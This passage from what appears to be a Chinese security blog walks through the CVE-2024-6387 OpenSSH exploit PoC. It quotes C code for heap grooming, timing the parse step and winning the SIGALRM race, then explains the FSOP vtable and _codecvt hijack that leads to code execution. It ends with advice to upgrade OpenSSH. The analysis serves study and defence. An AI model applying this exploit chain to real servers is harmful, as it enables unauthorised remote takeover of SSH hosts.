class="keyword">sizeof</span> (fake_data),</span><br><span class="line">                                  GLIBC_BASES[<span class="number">0</span>]);</span><br><span class="line">      send_packet (sock, <span class="number">5</span>, fake_data, <span class="keyword">sizeof</span> (fake_data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> large_string[MAX_PACKET_SIZE - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">memset</span> (large_string, <span class="string">&#x27;E&#x27;</span>, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">  send_packet (sock, <span class="number">5</span>, large_string, <span class="keyword">sizeof</span> (large_string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>send_packet</code> 实现了一个简单的 SSH 协议数据包封装，用于发送 SSH 数据包。</p>
<p>该函数中一共发送了4个数据包，这4个数据包的作用分别为：</p>
<ol>
<li>填充 tcache。</li>
<li>创建 27 个大小 chunk 对，大 chunk 为 8KB，小 chunk 为 320B。</li>
<li>写入伪造的 FILE 结构体数据。</li>
<li>发送一个超大数据包，使得服务端对该 chunk 进行分配与释放，令 glibc 将 27 个大小 chunk 对中的 27 个大 chunk 和 27 个小 chunk 转移到 large bins 与 small bins 中。</li>
</ol>
<h2 id="32-服务端解析数据时间测量"><a class="markdownIt-Anchor" href="#32-服务端解析数据时间测量"></a> 3.2 服务端解析数据时间测量</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">time_final_packet</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> *parsing_time)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> time_before = measure_response_time (sock, <span class="number">1</span>);</span><br><span class="line">  <span class="type">double</span> time_after = measure_response_time (sock, <span class="number">2</span>);</span><br><span class="line">  *parsing_time = time_after - time_before;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;Estimated parsing time: %.6f seconds\n&quot;</span>, *parsing_time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span></span><br><span class="line"><span class="title function_">measure_response_time</span> <span class="params">(<span class="type">int</span> sock, <span class="type">int</span> error_type)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">end</span>;</span></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line">  send_packet (sock, <span class="number">50</span>, error_packet,</span><br><span class="line">               packet_size); <span class="comment">// SSH_MSG_USERAUTH_REQUEST</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> response[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">ssize_t</span> received;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      received = recv (sock, response, <span class="keyword">sizeof</span> (response), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (received &lt; <span class="number">0</span> &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN));</span><br><span class="line"></span><br><span class="line">  clock_gettime (CLOCK_MONOTONIC, &amp;end);</span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> elapsed</span><br><span class="line">      = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">  <span class="keyword">return</span> elapsed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆内存布局完成后，POC 中通过 <code>time_final_packet</code> 来测量服务端解析客户端发送的数据的所需时间。这里测量了两次，分别代表不同错误的解析时间。两次测量对应的错误在 SSHd 中的时间差产生于是否调用了 <code>sshkey_from_blob</code>，因此将两个时间段相减即可得到函数 <code>sshkey_from_blob</code> 的执行时间。</p>
<h2 id="33-条件竞争"><a class="markdownIt-Anchor" href="#33-条件竞争"></a> 3.3 条件竞争</h2>
<p>完成上述操作之后，客户端还需要发送最后一个超大的 SSH 报文。该报文是算法协商报文，长度为 SSH 协议允许的最大长度。由于 SSH 报文前面带有长度字段，因此一个 SSH 报文允许被包装在多个 TCP 报文中传输。在下面的代码中，POC 直接发送最后一个报文，但故意少发送 1 个字节，让服务端一直等待最后 1 个字节的到来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">attempt_race_condition</span> <span class="params">(<span class="type">int</span> sock, <span class="type">double</span> parsing_time, <span class="type">uint64_t</span> glibc_base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> final_packet[MAX_PACKET_SIZE];</span><br><span class="line">  create_public_key_packet (final_packet, <span class="keyword">sizeof</span> (final_packet), glibc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send all but the last byte</span></span><br><span class="line">  <span class="keyword">if</span> (send (sock, final_packet, <span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;send final packet&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>随后，进行计时，准备好在即将超时的瞬间发送最后 1 个字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Precise timing for last byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">current</span>;</span></span><br><span class="line">clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    clock_gettime (CLOCK_MONOTONIC, &amp;current);</span><br><span class="line">    <span class="type">double</span> elapsed = (current.tv_sec - start.tv_sec)</span><br><span class="line">                     + (current.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">if</span> (elapsed &gt;= (LOGIN_GRACE_TIME - parsing_time - <span class="number">0.001</span>))</span><br><span class="line">      &#123; <span class="comment">// 1ms before SIGALRM</span></span><br><span class="line">        <span class="keyword">if</span> (send (sock, &amp;final_packet[<span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>], <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            perror (<span class="string">&quot;send last byte&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>发送最后一个字节后，服务端发现这是一个算法协商报文，因此会多次调用 <code>cert_parse</code> 函数进行解析。POC 精心构造了这个超长报文，使得 <code>cert_parse</code> 将会循环 54 次解析过程，每次解析过程都会调用一次 <code>malloc</code> 函数。POC 能够让 SSHd 以 0x4096、0x304（<code>FILE</code> 结构体的大小）、0x4096、0x304、… 的顺序调用 <code>malloc</code> 函数分配内存，使得在后面的一段时间内，SSHd 会进行一系列的内存分配，同时由于超时，SSHd 将异步地执行另外的内存分配。在此之前，由于我们分配的 8KB、320 Bytes 内存中的任意内容均可控，因此完全可以提前在 320 byte 的 chunk 中写好伪造的 <code>FILE</code> 结构体与虚假的过大的 remainder size。这样一来，只要 <code>syslog</code> 抢在 remainder size 更新前将虚大的 remainder 分配出去，就能够使 remainder 部分覆盖 <code>syslog</code> 获取的 <code>FILE</code> 结构体。</p>
<p>注意：由于 0x320 chunk 位于 tcache，因此 <code>syslog</code> 获取 <code>FILE</code> 结构体并不会切分 remainder，这个操作是由后面分配 4KB 的读缓冲区触发的。切分 remainder 后，还会剩下一个小 remainder，<code>_int_malloc</code> 一更新这个小 remainder 的相关字段，就完成了对 <code>syslog</code> 的 <code>FILE</code> 结构体的破坏。</p>
<p><img src="2.png" alt="" /></p>
<h2 id="34-fsop"><a class="markdownIt-Anchor" href="#34-fsop"></a> 3.4 FSOP</h2>
<p>该漏洞在32位下可以通过 FSOP 完成利用，这主要是考虑到 32 位系统的 ASLR 保护不完善，Glibc 只能映射到两个基地址：0xb7400000 或 0xb7200000。这正给了攻击者做文章的机会。</p>
<p>在上一节，我们提到通过更新 remainder 的 相关字段，能够达到破坏 <code>FILE</code> 结构体的效果。具体而言，它实际上是修改了 <code>FILE</code> 结构体中的 <code>_vtable_offset</code> 字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果猜测 Glibc 的映射基地址为 0xb7400000，那么 last remainder 的 <code>fd</code> 指针与 <code>bk</code> 指针指向 unsorted bin 后，其值应该为 0xb761d7f8（随 Glibc 版本不同而不同，但高 2 字节基本都相同），反映到上面的 <code>FILE</code> 结构体中，则是将 <code>_vtable_offset</code> 修改为 <code>bk</code> 指针的第 3 个字节——0x61。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /malloc/malloc.c, line 4024</span></span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">  av-&gt;last_remainder = remainder;</span><br><span class="line">  remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>在 Glibc 中，对于文件读写等操作的相关函数是统一保存在一个个 vtable 中的，实际执行时需要首先访问 vtable，再获取其中的函数指针以调用执行。将 <code>_vtable_offset</code> 改为 0x61 后，<code>syslog</code> 的 <code>__fread_unlocked</code> 将会找到 <code>_IO_wfile_jumps</code> 这个 vtable，选择其中的 <code>_IO_wfile_underflow</code> 函数执行（正常情况下应该是执行 <code>_IO_file_jumps</code> 中的 <code>_IO_file_underflow</code>）。在 <code>_IO_wfile_underflow</code> 中，存在下面的调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow</span><br><span class="line">  __libio_codecvt_in</span><br><span class="line">    DL_CALL_FCT</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /libio/wfileops.c, line 110</span></span><br><span class="line"></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;    <span class="comment">// line 130</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">      &amp;read_stop,</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);   <span class="comment">// line 141-146</span></span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// Glibc 2.36, /libio/iofwide.c, line 161</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;    <span class="comment">// line 178</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));    <span class="comment">// line 184-187</span></span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// Glibc 2.36, /iconv/skeleton.c, line 153</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，<code>fopen</code> 并没有对 <code>FILE</code> 结构体的 <code>_codecvt</code> 字段进行初始化，因此依然可以通过提前布置值完成对该字段的控制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /libio/libio.h, line 114</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// Glibc 2.36, /libio/libio.h, line 50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// Glibc 2.36, /iconv/gconv.h, line 83</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Description of a conversion step.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的结构定义来看，我们需要的 <code>__fct</code> 函数指针经过多层结构包装。为了让提前写入的指针能够完整地构建调用链，攻击者可以选择将 <code>_codecvt</code> 写成 Glibc 的 bins 的地址，这样实际就是让 Glibc 将我们释放的 chunk 的前面一小部分看做 <code>_IO_iconv_t</code> 结构，接下去如法炮制，在已经释放的 chunk 中完成精心构造，即可让代码最终执行我们伪造的 <code>__fct</code> 函数指针，完成任意代码执行。</p>
<h1 id="4-相关挑战"><a class="markdownIt-Anchor" href="#4-相关挑战"></a> 4. 相关挑战</h1>
<p>该漏洞的利用较为困难，这主要是因为猜测 ASLR 与时间窗口竞争叠加的结果。</p>
<p>地址空间布局随机化（Address Space Layout Randomization）是一种常用的程序运行时保护方式，多次执行时，同一个段会映射到不同的内存地址。但 glibc 在32位下实际上只会映射到 0xb7400000 或 0xb7200000，因此实现 FSOP 还是有可能的。但是时间竞争窗口较小，导致总体成功率依然极低（实验室环境下6~8小时尝试平均10000次才能成功）。在 64 位强化 ASLR 中，通过猜测 glibc 加载地址进行攻击的利用方式就更加无法实现了，需要通过其他的方式完成漏洞利用。</p>
<h1 id="5-总结"><a class="markdownIt-Anchor" href="#5-总结"></a> 5. 总结</h1>
<p>CVE-2024-6387 是一个高危的未授权任意代码远程执行漏洞，虽然目前的攻击方式较为复杂，攻击成功所需时间较长，但其危害仍不容忽视。建议升级 OpenSSH 至 9.8v1 及更高版本，或通过防火墙等方式缓解风险。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">PHP pwn 学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-01 18:31:42" itemprop="dateCreated datePublished" datetime="2024-07-01T18:31:42+08:00">2024-07-01</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>0</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">PHP pwn 学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

